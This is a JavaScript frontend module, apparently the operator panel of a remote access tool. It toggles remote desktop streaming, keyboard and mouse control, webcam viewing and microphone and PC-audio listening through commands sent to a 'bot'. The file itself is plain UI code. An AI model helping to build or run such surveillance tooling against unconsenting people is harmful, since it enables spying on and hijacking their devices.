// frontend/client_control/js/modules/ui/header.js

import { AppState } from '../core/states.js';

export function initHeaderControls() {
    const actions = [
        { id: 'btn-desktop-stream',  ref: AppState.desktop, key: 'observe', mod: 'ScreenWatch', cmds: ['start_stream', 'stop_stream'] },
        { id: 'btn-desktop-control', ref: AppState.desktop, key: 'control', mod: 'InputForge',  cmds: ['start_control', 'stop_control'] },
        { id: 'btn-webcam-stream',   ref: AppState.webcam,  key: 'active',  mod: 'CamGaze',     cmds: ['start', 'stop'] },
        { id: 'btn-audio-pc',        ref: AppState.audio,   key: 'output',  mod: 'AudioPulse',  cmds: ['listen_pc_on', 'listen_pc_off'] },
        { id: 'btn-audio-mic',       ref: AppState.audio,   key: 'input',   mod: 'AudioPulse',  cmds: ['listen_mic_on', 'listen_mic_off'] }
    ];

    const toggleAction = (action, forceState = null) => {
        const btn = document.getElementById(action.id);

        // Сброс флага paused перед переключением
        if (btn && btn.dataset.paused === 'true') {
            console.log("🔄 [Header] Сброс паузы перед переключением");
            btn.dataset.paused = 'false';
            btn.title = 'Start/Stop Stream';
        }

        const newState = (forceState !== null) ? forceState : !action.ref[action.key];

        action.ref[action.key] = newState;
        if (btn) btn.classList.toggle('active', newState);

        // Управление канвасом при включении контроля
        if (action.id === 'btn-desktop-control') {
            const canvas = document.getElementById('desktopCanvas');
            if (canvas) {
                if (newState) {
                    canvas.classList.add('control-active');
                    canvas.focus();
                    canvas.tabIndex = 1;
                    console.log("[Header] InputForge activated: Canvas focused");
                } else {
                    canvas.classList.remove('control-active');
                    console.log("[Header] InputForge deactivated");
                }
            }
        }

        if (window.sendToBot) {
            window.sendToBot(action.mod, newState ? action.cmds[0] : action.cmds[1]);
        }
    };

    actions.forEach(a => {
        const el = document.getElementById(a.id);
        if (el) el.onclick = () => toggleAction(a);
    });

    window.syncModeResources = (mode) => {
        if (mode === 'webcam') {
            if (AppState.desktop.observe) toggleAction(actions[0], false);
            if (AppState.desktop.control) toggleAction(actions[1], false);
        } else if (mode === 'desktop') {
            if (AppState.webcam.active) toggleAction(actions[2], false);
        }
    };
}